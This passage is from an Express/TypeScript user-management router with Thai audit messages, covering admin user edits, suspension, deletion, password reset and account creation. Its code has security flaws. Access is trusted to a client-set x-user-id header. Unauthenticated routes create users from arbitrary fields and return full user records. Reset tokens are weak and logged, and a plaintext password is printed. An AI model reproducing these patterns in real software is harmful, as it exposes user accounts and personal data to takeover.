      targetId: id,
      description: `แอดมินลบบัญชีผู้ใช้ ID: ${id}`
    });

    res.json({ success: true });
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// Admin: Update user fields
router.patch("/:id", requireAdmin, async (req, res) => {
  const { id } = req.params;
  const updates = req.body;

  // Whitelist fields that can be updated by admin
  const allowedFields = ['role', 'is_suspended', 'fname_th', 'lname_th', 'nickname', 'email', 'phone', 'gender', 'role_type', 'role_detail_1', 'role_detail_2', 'address', 'weight', 'height', 'birth_date', 'main_goal', 'underlying_disease', 'id_code'];
  const filteredUpdates: Record<string, any> = {};

  Object.keys(updates).forEach(key => {
    if (allowedFields.includes(key)) {
      filteredUpdates[key] = updates[key];
    }
  });

  if (Object.keys(filteredUpdates).length === 0) {
    return res.status(400).json({ error: "No valid fields provided for update" });
  }

  // Encrypt what needs encrypting from the allowed fields
  const encUpdates = encryptFields(filteredUpdates, USER_ENCRYPTED_FIELDS);

  const updateKeys = Object.keys(encUpdates);
  const updateValues = Object.values(encUpdates);

  if (updateKeys.length === 0) return res.status(400).json({ error: "Empty update" });

  const setClause = updateKeys.map(k => `${k} = ?`).join(', ');

  try {
    await pool.query(`UPDATE users SET ${setClause} WHERE id = ?`, [...updateValues, id]);

    // Log the action
    await logAudit({
      userId: req.headers['x-user-id'] as string,
      action: 'admin_update_user',
      targetType: 'user',
      targetId: id,
      description: `แอดมินแก้ไขข้อมูลผู้ใช้ ID: ${id}`,
      metadata: { updates: Object.keys(filteredUpdates) }
    });

    const [rows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [id]);
    const updatedUser = decryptFields(rows[0], USER_ENCRYPTED_FIELDS) || {};

    // Emit Realtime Update
    getIO().emit(EVENTS.USER_UPDATED, { id: Number(id), ...updatedUser });
    res.json(updatedUser);
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// Deprecated role-specific endpoint - keeping for compatibility but forwarding to generic one
router.patch("/:id/role", requireAdmin, async (req, res) => {
  const { id } = req.params;
  const { role } = req.body;

  try {
    await pool.query('UPDATE users SET role = ? WHERE id = ?', [role, id]);
    const [rows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [id]);
    const updatedUser = decryptFields(rows[0], USER_ENCRYPTED_FIELDS) || {};

    // Emit Realtime Update
    getIO().emit(EVENTS.USER_UPDATED, { id: Number(id), ...updatedUser });

    res.json(updatedUser);
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});



// 5. User Basic Info (Generic :id last)
router.get("/:id", async (req, res) => {
  const requesterId = req.headers['x-user-id'];
  const { id } = req.params;

  if (!requesterId) return res.status(401).json({ error: "Unauthorized" });

  try {
    // Permission Check (Self OR Admin OR Host)
    const [reqUserRows]: any = await pool.query("SELECT role FROM users WHERE id = ?", [requesterId]);
    const requesterRole = reqUserRows[0]?.role;

    if (String(requesterId) !== String(id) && requesterRole !== 'admin' && requesterRole !== 'host') {
      return res.status(403).json({ error: "Forbidden: You cannot access this user's data" });
    }

    const [rows]: any = await pool.query(`
        SELECT u.*, tm.name as team_name 
        FROM users u 
        LEFT JOIN teams tm ON u.team_id = tm.id 
        WHERE u.id = ?
     `, [id]);
    if (rows.length === 0) return res.status(404).json({ error: "User not found" });
    res.json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS));
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

router.get("/line/:lineId", async (req, res) => {
  try {
    const [rows]: any = await pool.query('SELECT * FROM users WHERE line_id = ?', [req.params.lineId]);
    if (rows.length === 0) return res.status(404).json({ error: "User not found" });
    res.json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS));
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

router.post("/", async (req, res) => {
  try {
    const encryptedBody = encryptFields(req.body, USER_ENCRYPTED_FIELDS);
    const keys = Object.keys(encryptedBody);
    const values = Object.values(encryptedBody);

    if (keys.length === 0) return res.status(400).json({ error: "Empty body" });

    const placeholders = keys.map(() => '?').join(', ');

    const [result]: any = await pool.query(
      `INSERT INTO users (${keys.join(', ')}) VALUES (${placeholders})`,
      values
    );

    const [rows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [result.insertId]);
    res.status(201).json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS));
  } catch (error: any) {
    res.status(400).json({ error: "Bad Request" });
  }
});

// PATCH endpoint for updating user
router.patch("/:id", async (req, res) => {
  const requesterId = req.headers['x-user-id'];
  const { id } = req.params;

  if (!requesterId) return res.status(401).json({ error: "Unauthorized" });

  try {
    // Permission Check (Admin only for most fields, self for limited fields)
    const [reqUserRows]: any = await pool.query("SELECT role FROM users WHERE id = ?", [requesterId]);
    const requesterRole = reqUserRows[0]?.role;

    if (requesterRole !== 'admin' && String(requesterId) !== String(id)) {
      return res.status(403).json({ error: "Forbidden: You cannot update this user's data" });
    }

    // Get current user data
    const [currentUserRows]: any = await pool.query("SELECT * FROM users WHERE id = ?", [id]);
    if (currentUserRows.length === 0) return res.status(404).json({ error: "User not found" });

    // Prepare update data
    const updateData: any = {};
    const allowedFields = [
      'fname_th', 'lname_th', 'nickname', 'email', 'phone', 'id_code',
      'role_type', 'role_detail_1', 'role_detail_2', 'address',
      'weight', 'height', 'gender', 'birth_date', 'underlying_disease', 'main_goal',
      'role', 'is_suspended'
    ];

    // Non-admin users can only update limited fields
    const selfAllowedFields = ['fname_th', 'lname_th', 'nickname', 'phone', 'address', 'weight', 'height', 'gender', 'birth_date', 'underlying_disease', 'main_goal'];
    const fieldsToCheck = requesterRole === 'admin' ? allowedFields : selfAllowedFields;

    for (const field of fieldsToCheck) {
      if (req.body[field] !== undefined) {
        updateData[field] = req.body[field];
      }
    }

    if (Object.keys(updateData).length === 0) {
      return res.status(400).json({ error: "No valid fields to update" });
    }

    // Encrypt sensitive fields
    const encryptedUpdate = encryptFields(updateData, USER_ENCRYPTED_FIELDS);

    // Build dynamic update query
    const updateFields = Object.keys(encryptedUpdate);
    const updateValues = Object.values(encryptedUpdate);
    const setClause = updateFields.map(field => `${field} = ?`).join(', ');

    const [result] = await pool.query(
      `UPDATE users SET ${setClause} WHERE id = ?`,
      [...updateValues, id]
    ) as any;

    if (result.affectedRows === 0) {
      return res.status(404).json({ error: "User not found or no changes made" });
    }

    // Get updated user data
    const [updatedRows]: any = await pool.query(`
      SELECT u.*, tm.name as team_name 
      FROM users u 
      LEFT JOIN teams tm ON u.team_id = tm.id 
      WHERE u.id = ?
    `, [id]);

    const description = `อัปเดตข้อมูลผู้ใช้ ID: ${id}, ฟิลด์: ${Object.keys(updateData).join(', ')}`;
    await logAudit({
      req,
      userId: Array.isArray(requesterId) ? parseInt(requesterId[0]) : parseInt(requesterId),
      action: 'update_user',
      targetId: parseInt(id),
      description
    });

    res.json(decryptFields(updatedRows[0], USER_ENCRYPTED_FIELDS));
  } catch (error: any) {
    console.error("Update user error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// PATCH endpoint for suspending/unsuspending user
router.patch("/:id/suspend", async (req, res) => {
  const requesterId = req.headers['x-user-id'];
  const { id } = req.params;
  const { is_suspended } = req.body;

  if (!requesterId) return res.status(401).json({ error: "Unauthorized" });

  try {
    // Only admin can suspend users
    const [reqUserRows]: any = await pool.query("SELECT role FROM users WHERE id = ?", [requesterId]);
    const requesterRole = reqUserRows[0]?.role;

    if (requesterRole !== 'admin') {
      return res.status(403).json({ error: "Forbidden: Only admins can suspend users" });
    }

    // Cannot suspend yourself
    if (String(requesterId) === String(id)) {
      return res.status(400).json({ error: "Cannot suspend yourself" });
    }

    const [result] = await pool.query(
      "UPDATE users SET is_suspended = ? WHERE id = ?",
      [is_suspended ? 1 : 0, id]
    ) as any;

    if (result.affectedRows === 0) {
      return res.status(404).json({ error: "User not found" });
    }

    const description = `${is_suspended ? 'แบน' : 'เลิกแบน'}ผู้ใช้ ID: ${id}`;
    await logAudit({
      req,
      userId: Array.isArray(requesterId) ? parseInt(requesterId[0]) : parseInt(requesterId),
      action: is_suspended ? 'suspend_user' : 'unsuspend_user',
      targetId: parseInt(id),
      description
    });

    res.json({ message: `User ${is_suspended ? 'suspended' : 'unsuspended'} successfully` });
  } catch (error: any) {
    console.error("Suspend user error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// DELETE endpoint for deleting user
router.delete("/:id", async (req, res) => {
  const requesterId = req.headers['x-user-id'];
  const { id } = req.params;

  if (!requesterId) return res.status(401).json({ error: "Unauthorized" });

  try {
    // Only admin can delete users
    const [reqUserRows]: any = await pool.query("SELECT role FROM users WHERE id = ?", [requesterId]);
    const requesterRole = reqUserRows[0]?.role;

    if (requesterRole !== 'admin') {
      return res.status(403).json({ error: "Forbidden: Only admins can delete users" });
    }

    // Cannot delete yourself
    if (String(requesterId) === String(id)) {
      return res.status(400).json({ error: "Cannot delete yourself" });
    }

    const [result] = await pool.query("DELETE FROM users WHERE id = ?", [id]) as any;

    if (result.affectedRows === 0) {
      return res.status(404).json({ error: "User not found" });
    }

    const description = `ลบผู้ใช้ ID: ${id}`;
    await logAudit({
      req,
      userId: Array.isArray(requesterId) ? parseInt(requesterId[0]) : parseInt(requesterId),
      action: 'delete_user',
      targetId: parseInt(id),
      description
    });

    res.json({ message: "User deleted successfully" });
  } catch (error: any) {
    console.error("Delete user error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});



// Admin: Reset password and send email
router.post("/:id/reset-password", requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const adminId = req.headers['x-user-id'] as string;

    const [userRows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [id]);
    if (userRows.length === 0) {
      return res.status(404).json({ error: "User not found" });
    }

    const user = userRows[0];
    if (!user.email) {
      return res.status(400).json({ error: "User does not have email address" });
    }

    // Generate reset token
    const resetToken = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    const resetTokenExpiry = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24 hours

    await pool.query(
      'UPDATE users SET reset_token = ?, reset_token_expiry = ? WHERE id = ?',
      [resetToken, resetTokenExpiry, id]
    );

    // Log the action
    await logAudit({
      userId: adminId,
      action: 'admin_password_reset',
      description: `Admin sent password reset for user ${user.fname_th} ${user.lname_th}`,
      targetType: 'user',
      targetId: parseInt(id),
      metadata: { target_user_id: id, reset_token: resetToken },
      ipAddress: req.ip,
      userAgent: req.get('user-agent')
    });

    // TODO: Send actual email with reset link
    console.log(`Password reset link for ${user.email}: ${process.env.FRONTEND_URL}/reset-password?token=${resetToken}`);

    res.json({ message: "Password reset email sent successfully" });
  } catch (error: any) {
    console.error("Password reset error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// Admin: Verify email manually
router.post("/:id/verify-email", requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const adminId = req.headers['x-user-id'] as string;

    const [userRows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [id]);
    if (userRows.length === 0) {
      return res.status(404).json({ error: "User not found" });
    }

    await pool.query('UPDATE users SET email_verified = 1 WHERE id = ?', [id]);

    await logAudit({
      userId: adminId,
      action: 'admin_email_verify',
      description: `Admin manually verified email for user ${userRows[0].fname_th} ${userRows[0].lname_th}`,
      targetType: 'user',
      targetId: parseInt(id),
      metadata: { target_user_id: id },
      ipAddress: req.ip,
      userAgent: req.get('user-agent')
    });

    res.json({ message: "Email verified successfully" });
  } catch (error: any) {
    console.error("Email verification error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});


// Admin: Unlink LINE account
router.post("/:id/unlink-line", requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const adminId = req.headers['x-user-id'] as string;

    const [userRows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [id]);
    if (userRows.length === 0) {
      return res.status(404).json({ error: "User not found" });
    }

    await pool.query('UPDATE users SET line_id = NULL, line_display_name = NULL, line_picture_url = NULL WHERE id = ?', [id]);

    await logAudit({
      userId: adminId,
      action: 'admin_unlink_line',
      description: `Admin unlinked LINE account for user ${userRows[0].fname_th} ${userRows[0].lname_th}`,
      targetType: 'user',
      targetId: parseInt(id),
      metadata: { target_user_id: id },
      ipAddress: req.ip,
      userAgent: req.get('user-agent')
    });

    res.json({ message: "LINE account unlinked successfully" });
  } catch (error: any) {
    console.error("LINE unlink error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// Admin: Revoke all sessions (force logout)
router.post("/:id/revoke-sessions", requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const adminId = req.headers['x-user-id'] as string;

    const [userRows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [id]);
    if (userRows.length === 0) {
      return res.status(404).json({ error: "User not found" });
    }

    // Clear all tokens for this user
    await pool.query('UPDATE users SET reset_token = NULL, reset_token_expiry = NULL WHERE id = ?', [id]);

    // TODO: Clear any session tokens from your session store
    // This depends on your session management system

    await logAudit({
      userId: adminId,
      action: 'admin_revoke_sessions',
      description: `Admin revoked all sessions for user ${userRows[0].fname_th} ${userRows[0].lname_th}`,
      targetType: 'user',
      targetId: parseInt(id),
      metadata: { target_user_id: id },
      ipAddress: req.ip,
      userAgent: req.get('user-agent')
    });

    res.json({ message: "All sessions revoked successfully" });
  } catch (error: any) {
    console.error("Session revocation error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});


// Admin: Create new user
router.post("/", requireAdmin, async (req, res) => {
  try {
    const adminId = req.headers['x-user-id'] as string;
    const { email, fname_th, lname_th, phone, role, password, send_email } = req.body;

    if (!email || !fname_th || !lname_th) {
      return res.status(400).json({ error: "Email, first name, and last name are required" });
    }

    // Check if email already exists
    const [existingUsers]: any = await pool.query('SELECT id FROM users WHERE email = ?', [email]);
    if (existingUsers.length > 0) {
      return res.status(400).json({ error: "Email already exists" });
    }

    // Generate password if not provided
    const finalPassword = password || Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    const hashedPassword = await bcrypt.hash(finalPassword, 10);

    const encryptedBody = encryptFields({
      email,
      fname_th,
      lname_th,
      phone: phone || '',
      role: role || 'user',
      password: hashedPassword,
      email_verified: 1, // Auto-verify admin-created accounts
      created_at: new Date()
    }, USER_ENCRYPTED_FIELDS);

    const [result]: any = await pool.query('INSERT INTO users SET ?', encryptedBody);
    const userId = result.insertId;

    await logAudit({
      userId: adminId,
      action: 'admin_create_user',
      description: `Admin created user ${fname_th} ${lname_th}`,
      targetType: 'user',
      targetId: userId,
      metadata: {
        created_user_id: userId,
        email,
        role: role || 'user',
        send_email
      },
      ipAddress: req.ip,
      userAgent: req.get('user-agent')
    });

    // TODO: Send welcome email with password if send_email is true
    if (send_email) {
      console.log(`Welcome email should be sent to ${email} with password: ${finalPassword}`);
    }

    res.json({
      message: "User created successfully",
      user_id: userId,
      password: send_email ? null : finalPassword // Only return password if not sending email
    });
  } catch (error: any) {
    console.error("Create user error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

export default router;
